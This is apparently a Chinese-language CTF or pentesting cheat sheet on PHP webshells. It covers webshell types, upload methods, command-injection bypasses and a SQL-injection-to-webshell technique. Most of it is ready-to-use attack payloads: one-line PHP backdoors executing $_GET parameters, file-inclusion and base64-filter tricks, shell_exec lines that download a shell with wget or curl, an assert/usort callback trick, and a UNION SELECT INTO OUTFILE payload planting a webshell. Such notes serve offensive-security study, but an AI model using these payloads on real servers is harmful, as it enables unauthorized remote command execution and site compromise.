# Webshell
一種以網頁形式存在的命令執行環境，也稱作**網頁後門**。  
黑客可以通過瀏覽自己放的後門，得到一個shell以操控伺服器。  
1. 大馬  
程式較龐大，調用system func()，通常會以加密隱藏代碼。   
2. 小馬  
程式小巧   
3. 一句話木馬  
一段小代碼，可做插入，變化多樣。  
*  [How works](#how-works)  
*  [Command injection](#command-injection)  
*  [Webshell cheatsheet](#webshell-cheatsheet)  
*  [SQL inj to webshell](#sql-inj-to-webshell)  
*  [Reference](#reference)

# How works
我們可以通過網站自帶的文件上傳功能將webshell送上去，而文件裡的代碼由server解析進一步執行!  
1. 尋找上傳點   
* echo 一個shell到文件中執行  
* 下載 shell  
2. 繞過上傳限制 進行上傳  
* 直接上傳  
* 繞過  

# Command injection
```php
// match one character
cat fla?
cat ./???sword

// match multiple character
cat f*

// bypass space 
cat${IFS}flag
```
   
# Webshell cheatsheet
```php
<?php system('ls'); ?>
<?php system(ls); ?>
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>

<?=`$_GET[1]`;                   // <?= is used to shorten the <?php echo `blah`;
// ``就像exec不會直接顯示結果，需要echo
echo `$_GET[1]`;&1=ls

// local file inclusion
include$_GET[1];             // 中間空格可以省略

// 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
$_GET[1](file,chracter,8);&1=file_put_contents .....
include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file

<?php shell_exec('echo 1>1');        // 1=echo 1>1
<?php shell_exec('>1');            // 1=>1

<?php shell_exec('wget -O 1.php url');    // download shell
<?php shell_exec('curl -o 1.php url');    // 預設下載index.html

// 思路：延伸數組＋回調函數 php 5.4以後的特性  
// 參考下方reference
?1[]=blah&1[]=system();&2=assert
param=usort(...$_GET);
```
長度限制思路：  
* 用檔名拼湊成命令,再一次ls進一個shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)

[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
**基本上除了system都不會直接show在頁面上，exec()和shell_exec()我們都會搭個echo**

# SQL inj to webshell
MYSQL:  
```
select into outfile(dumpfile)  // mysql write to document
```  
E.G.  
```  
union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
```

### Reference  
* [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
* [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)  
* [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
* [PHP MANUAL Usort](http://php.net/manual/en/function.usort.php)  
* [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
